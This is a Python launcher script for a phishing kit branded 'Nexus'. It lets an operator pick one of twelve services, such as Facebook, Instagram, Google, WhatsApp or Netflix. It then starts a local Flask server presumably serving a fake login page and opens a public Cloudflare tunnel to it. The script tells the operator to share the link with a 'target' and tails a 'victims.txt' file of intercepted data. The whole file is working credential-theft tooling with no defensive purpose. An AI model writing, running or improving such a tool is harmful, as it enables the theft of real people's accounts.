import os, subprocess, time, re, sys
from colorama import Fore, Style, init

init(autoreset=True)

def banner():
    os.system('clear')
    print(f"{Fore.RED}{Style.BRIGHT}      _   _                         ")
    print(f"{Fore.RED}{Style.BRIGHT}     | \ | | _____  ___   _ ___     ")
    print(f"{Fore.RED}{Style.BRIGHT}     |  \| |/ _ \ \/ / | | / __|    ")
    print(f"{Fore.WHITE}{Style.BRIGHT}     | |\  |  __/>  <| |_| \__ \    ")
    print(f"{Fore.WHITE}{Style.BRIGHT}     |_| \_|\___/_/\_\\__,_|___/    ")
    print(f"{Fore.CYAN}============================================")
    print(f"{Fore.YELLOW}  DEVELOPED BY: {Fore.WHITE}Med Rayen Bouazizi")
    print(f"{Fore.YELLOW}  LABS: {Fore.WHITE}Quantum Nexus Labs")
    print(f"{Fore.CYAN}============================================")

def get_link():
    """Extracts the global URL from the logs."""
    if os.path.exists("tunnel.log"):
        with open("tunnel.log", "r") as f:
            match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", f.read())
            return match.group(0) if match else None
    return None

def main():
    banner()
    print(f"{Fore.GREEN}[01] Facebook    [05] Google      [09] LinkedIn")
    print(f"{Fore.GREEN}[02] Instagram   [06] Netflix     [10] FreeFire")
    print(f"{Fore.GREEN}[03] TikTok      [07] Spotify     [11] PUBG")
    print(f"{Fore.GREEN}[04] Snapchat    [08] WhatsApp    [12] X (Twitter)")
    print(f"{Fore.RED}\n[00] Exit System")
    
    choice = input(f"\n{Fore.WHITE}Nexus@Admin:~$ ")
    if choice == "00": sys.exit()
    
    mapping = {
        "1":"facebook", "2":"instagram", "3":"tiktok", "4":"snapchat",
        "5":"google", "6":"netflix", "7":"spotify", "8":"whatsapp",
        "9":"linkedin", "10":"freefire", "11":"pubg", "12":"twitter"
    }
    target = mapping.get(choice.lstrip('0'), "facebook")

    # Clean up background tasks
    subprocess.run(["pkill", "-f", "cloudflared"], stdout=subprocess.DEVNULL)
    subprocess.run(["pkill", "-f", "app.py"], stdout=subprocess.DEVNULL)

    # Launch Flask Server
    print(f"\n{Fore.BLUE}[*] Initializing local server for {target.upper()}...")
    flask_proc = subprocess.Popen(["python", "app.py", target], stdout=subprocess.DEVNULL)

    # Launch International Tunnel
    print(f"{Fore.BLUE}[*] Generating International Link (Wait 10s)...")
    with open("tunnel.log", "w") as log:
        cloud_proc = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://127.0.0.1:5000"], stdout=log, stderr=log)

    time.sleep(10)
    url = get_link()
    
    if url:
        print(f"\n{Fore.MAGENTA}{Style.BRIGHT}🔗 GLOBAL LINK: {Fore.WHITE}{url}")
        print(f"{Fore.YELLOW}[!] Share this link with your target internationally.")
    else:
        print(f"\n{Fore.RED}[!] Tunnel Error. Check your internet connection.")
        flask_proc.terminate()
        return

    print(f"\n{Fore.WHITE}--- {Fore.GREEN}REAL-TIME DATA INTERCEPTION {Fore.WHITE}---")
    try:
        subprocess.run(["tail", "-f", "victims.txt"])
    except KeyboardInterrupt:
        flask_proc.terminate()
        cloud_proc.terminate()
        print(f"\n{Fore.YELLOW}[!] Session Terminated by Med Rayen Bouazizi.")

if __name__ == "__main__":
    main()

